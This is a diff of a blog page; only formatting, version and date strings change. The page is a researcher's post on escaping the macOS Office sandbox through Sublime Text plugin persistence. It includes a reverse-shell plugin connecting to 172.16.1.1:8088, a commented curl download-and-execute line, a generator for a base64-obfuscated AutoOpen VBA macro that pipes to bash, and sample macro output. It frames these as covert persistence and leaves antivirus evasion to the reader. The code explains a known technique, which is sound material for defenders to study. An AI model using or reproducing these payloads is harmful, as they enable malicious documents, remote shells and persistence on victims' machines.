@@ -3,7 +3,7 @@
 <head>
   <link href="https://gmpg.org/xfn/11" rel="profile">
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.60.1" />
+  <meta name="generator" content="Hugo 0.88.1" />
 
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -44,7 +44,7 @@
       </ul>
     </nav>
 
-    <p>&copy; 2020. All rights reserved. </p>
+    <p>&copy; 2021. All rights reserved. </p>
   </div>
 </aside>
 
@@ -58,24 +58,24 @@
 <li>The MS Office sandbox allows writing files to arbitrary locations as long as they begin with <code>~$</code>, with some exceptions</li>
 <li>The Sublime Text editor automatically loads (outside the sandbox) Python plugins from a user writable file path</li>
 </ol>
-<p>After reading Patrick Wardle's <a href="https://objective-see.com/blog/blog_0x4B.html">Office Drama on macOS</a> which outlined a persistence method leveraging a sandbox escaped discovered by Adam Chester (see <a href="https://objective-see.com/blog/blog_0x35.html">Escaping the Microsoft Office Sandbox</a>), I did some rudimentary experimenting. Recent patches have precluded directly writing to <code>LaunchAgents</code> or <code>Application Scripts</code> but files can still be written to other user writable paths as long as they start with <code>~$</code>.</p>
-<p>There are likely a plethora of creative options but having Sublime Text installed I found a nice option for escaping the Office sandbox. Feel free to skip to the end if you're not interested in the Sublime Plugin aspect.</p>
-<p>I'm certainly not the first to leverage Sublime for persistence. Prior art by <a href="https://theevilbit.github.io/posts/macos_persisting_through-application_script_files/">theevilbit</a> is worth a quick read and that post goes into persisting in Python imports and others applications. Leo Pitt also outlined its usage with JXA and Apfell <a href="https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5">here</a>. That post also covers some good detection method as well.</p>
+<p>After reading Patrick Wardle&rsquo;s <a href="https://objective-see.com/blog/blog_0x4B.html">Office Drama on macOS</a> which outlined a persistence method leveraging a sandbox escaped discovered by Adam Chester (see <a href="https://objective-see.com/blog/blog_0x35.html">Escaping the Microsoft Office Sandbox</a>), I did some rudimentary experimenting. Recent patches have precluded directly writing to <code>LaunchAgents</code> or <code>Application Scripts</code> but files can still be written to other user writable paths as long as they start with <code>~$</code>.</p>
+<p>There are likely a plethora of creative options but having Sublime Text installed I found a nice option for escaping the Office sandbox. Feel free to skip to the end if you&rsquo;re not interested in the Sublime Plugin aspect.</p>
+<p>I&rsquo;m certainly not the first to leverage Sublime for persistence. Prior art by <a href="https://theevilbit.github.io/posts/macos_persisting_through-application_script_files/">theevilbit</a> is worth a quick read and that post goes into persisting in Python imports and others applications. Leo Pitt also outlined its usage with JXA and Apfell <a href="https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5">here</a>. That post also covers some good detection method as well.</p>
 <h2 id="sublime-text-packages">Sublime Text Packages</h2>
 <p>Sublime leverages Python for its plugin ecosystem. If you have the permissions to edit files in <code>C:\Program Files\</code>, you can simply edit <code>sublime.py</code> or <code>sublime_plugin.py</code> for your persistence needs. When Sublime next starts, your code will run. If Sublime is already running, you can call <code>c:\Program Files\Sublime Text 3\subl.exe &lt;sublime pid&gt;</code> and it will reload those files.</p>
-<p>But maybe you can't write to <code>C:\Program Files</code> or want to keep things a bit more covert. If you can write to <code>%APPDATA%\Sublime Text 3\Packages\</code> or <code>$HOME/Library/Application Support/Sublime Text 3/Packages/</code> you can create a plugin to help you out.</p>
+<p>But maybe you can&rsquo;t write to <code>C:\Program Files</code> or want to keep things a bit more covert. If you can write to <code>%APPDATA%\Sublime Text 3\Packages\</code> or <code>$HOME/Library/Application Support/Sublime Text 3/Packages/</code> you can create a plugin to help you out.</p>
 <p>In the Packages directory, create a file <code>package-control.py</code> or other innocuously named file. It can be any Python code, but if you want to play nice with Sublime, the following template will work.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sublime<span style="color:#f92672">,</span> sublime_plugin<span style="color:#f92672">,</span> os;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sublime<span style="color:#f92672">,</span> sublime_plugin<span style="color:#f92672">,</span> os;
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">plugin_loaded</span>():
-  os<span style="color:#f92672">.</span>system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">open -a /Applications/Calculator.app</span><span style="color:#e6db74">&#39;</span>)
-</code></pre></div><p>This creates and automatically loads the new plugin. Newer versions appear to execute the plugin the moment it's saved but older versions may need reloaded with <code>subl</code> or <code>subl.exe</code> commands with the <code>-b</code> option to run in the background.</p>
+  os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;open -a /Applications/Calculator.app&#39;</span>)
+</code></pre></div><p>This creates and automatically loads the new plugin. Newer versions appear to execute the plugin the moment it&rsquo;s saved but older versions may need reloaded with <code>subl</code> or <code>subl.exe</code> commands with the <code>-b</code> option to run in the background.</p>
 <h3 id="creating-binary-packages">Creating Binary Packages</h3>
 <p>If you would like to keep your Python persistence one level beyond prying eyes, create a <code>.sublime-package</code> file, which is basically a zip file of python bytecode. <a href="https://packagecontrol.io/">Package Control</a> is the package manager for Sublime Text and will do this for you. To create a new package, first Install Package Control: <code>Cmd + Shift + P</code> &gt; <code>Install Package Control</code>.</p>
 <p>Package Control expects a folder under Packages so create that first.</p>
 <p><code>mkdir ~/Library/Application Support/Sublime Text 3/Packages/legitimate</code></p>
 <p>Then add your benign python code to that folder.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat &gt; ~/Library/Application Support/Sublime Text 3/Packages/legitimate.py <span style="color:#e6db74">&lt;&lt; EOF
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat &gt; ~/Library/Application Support/Sublime Text 3/Packages/legitimate.py <span style="color:#e6db74">&lt;&lt; EOF
 </span><span style="color:#e6db74">import sublime, sublime_plugin, socket, subprocess, os;
 </span><span style="color:#e6db74">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 </span><span style="color:#e6db74">s.connect((&#34;172.16.1.1&#34;,8088));
@@ -89,53 +89,53 @@
 <p>This file can now be copied to <code>~/Library/Application Support/Sublime Text 3/Installed Packages/</code> or <code>%APPDATA%\Sublime Text 3\Installed Packages\</code> where Sublime will automatically pick it up and run your code.</p>
 <blockquote>
 <p>Note: I did run into some issues with Package Control not compiling my code on macOS, but manually compiling before creating the package seemed to get things working.</p>
-<pre><code>% cd ~/Library/Application\ Support/Sublime\ Text\ 3/Packages/legitimate
+<pre tabindex="0"><code>% cd ~/Library/Application\ Support/Sublime\ Text\ 3/Packages/legitimate
 % python -m compileall legitimate.py
 % rm legitimate.py #YMMV```
 </code></pre></blockquote>
 <h2 id="macros">Macros</h2>
 <p>So how do we leverage all that to seamlessly escape the Office sandbox? The following code snippet is sufficient to have Sublime execute Python of our choosing outside the sandbox. Or rather than the code snippet, copy the binary sublime-package file to the <code>Installed Packages</code> to provide some obfuscation.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
 
-forsublime <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">import os</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">os.system(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">open -a /Applications/Calculator.app</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">#os.system(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">curl example.com/malware</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> &amp;&amp; chmod +x malware &amp;&amp; ./malware</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+forsublime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">import os
+</span><span style="color:#e6db74">os.system(&#39;open -a /Applications/Calculator.app&#39;)
+</span><span style="color:#e6db74">#os.system(&#39;curl example.com/malware&#39; &amp;&amp; chmod +x malware &amp;&amp; ./malware&#39;)
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
 
 <span style="color:#75715e"># the above is saved to the Office sandbox</span>
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">legitimatefile.txt</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;legitimatefile.txt&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
 	f<span style="color:#f92672">.</span>write(forsublime)
 
 <span style="color:#75715e"># and we copy it to Sublime&#39;s plugin folder</span>
-os<span style="color:#f92672">.</span>system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">cp legitimatefile.txt /Users/$USER/Library/Application Support/Sublime Text 3/Installed Packages/~</span><span style="color:#e6db74">\</span><span style="color:#e6db74">$legitimate_plugin.sublime-package</span><span style="color:#e6db74">&#34;</span>)
+os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cp legitimatefile.txt /Users/$USER/Library/Application Support/Sublime Text 3/Installed Packages/~\$legitimate_plugin.sublime-package&#34;</span>)
 
 <span style="color:#75715e"># if Sublime isn&#39;t running, help the user out</span>
-os<span style="color:#f92672">.</span>system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">open -a /Application/Sublime Text.app</span><span style="color:#e6db74">&#34;</span>)
+os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;open -a /Application/Sublime Text.app&#34;</span>)
 </code></pre></div><p>And the following helper function makes it easy to drop that into a macro.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
 
 e <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(abovepythoncode)
-p <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">echo </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">import base64, exec(base64.b64decode(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">));</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> | /usr/bin/python &amp;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(e)
+p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">import base64, exec(base64.b64decode(&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;));</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> | /usr/bin/python &amp;&#34;</span><span style="color:#f92672">.</span>format(e)
 out <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(p)
 n <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
 macro <span style="color:#f92672">=</span> []
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(out), n):
     <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
-        macro<span style="color:#f92672">.</span>append(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">str = </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> out[i:i<span style="color:#f92672">+</span>n])
+        macro<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;str = </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> out[i:i<span style="color:#f92672">+</span>n])
     <span style="color:#66d9ef">else</span>:
-        macro<span style="color:#f92672">.</span>append(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">str = str + </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> out[i:i<span style="color:#f92672">+</span>n])
+        macro<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;str = str + </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> out[i:i<span style="color:#f92672">+</span>n])
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">Sub AutoOpen()</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">Dim Str</span><span style="color:#e6db74">
+print(<span style="color:#e6db74">&#39;&#39;&#39;Sub AutoOpen()
+</span><span style="color:#e6db74">Dim Str
 </span><span style="color:#e6db74"></span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">MacScript </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">do shell script </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">echo </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> &amp; Str &amp; </span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> | /usr/bin/base64 -D | /bin/bash</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">End Sub</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>)<span style="color:#f92672">.</span>format(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(macro))
+</span><span style="color:#e6db74">MacScript &#34;do shell script &#34;&#34;echo </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;&#34; &#34; &amp; Str &amp; &#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;&#34; | /usr/bin/base64 -D | /bin/bash&#34;&#34; &#34;
+</span><span style="color:#e6db74">End Sub
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>)<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(macro))
 
 </code></pre></div><p>Leaving you with something like the following. AV and EDR avoidance obviously up to you.</p>
-<pre><code>Sub AutoOpen()
+<pre tabindex="0"><code>Sub AutoOpen()
 Dim Str
 str = &quot;ZWNobyAiaW1wb3J0IGJhc2U2NCBhcyBiLCBzeXM7IG&quot;
 str = str + &quot;V4ZWMoYi5iNjRkZWNvZGUoJ2ltcG9ydCBvczsgb3Mu&quot;
@@ -148,13 +148,11 @@ str = str + &quot;knKSk7IiB8IHB5dGhvbiAgJg==&quot;
 MacScript &quot;do shell script &quot;&quot; echo \&quot;&quot; &quot; &amp; Str &amp; &quot; \&quot;&quot; | /usr/bin/base64 -D | /bin/bash&quot;&quot; &quot;
 End Sub
 </code></pre><p>Assuming that macro was run, the attacker is receives a shell but one restricted to the Office sandbox. In the following screenshot you see access to <code>/tmp/</code> is not permitted, and any attempt to access user directories is met with the same message.</p>
-<figure>
-    <img src="https://www.thesubtlety.com/img/sublime-sandbox.png"/> 
+<figure><img src="https://www.thesubtlety.com/img/sublime-sandbox.png"/>
 </figure>
 
 <p>But once we copy our malicious Sublime package to the Installed Packages directory, we immediately see another reverse shell come in, this time without the sandbox restrictions.</p>
-<figure>
-    <img src="https://www.thesubtlety.com/img/sublime-out-of-the-sandbox.png"/> 
+<figure><img src="https://www.thesubtlety.com/img/sublime-out-of-the-sandbox.png"/>
 </figure>
 
 
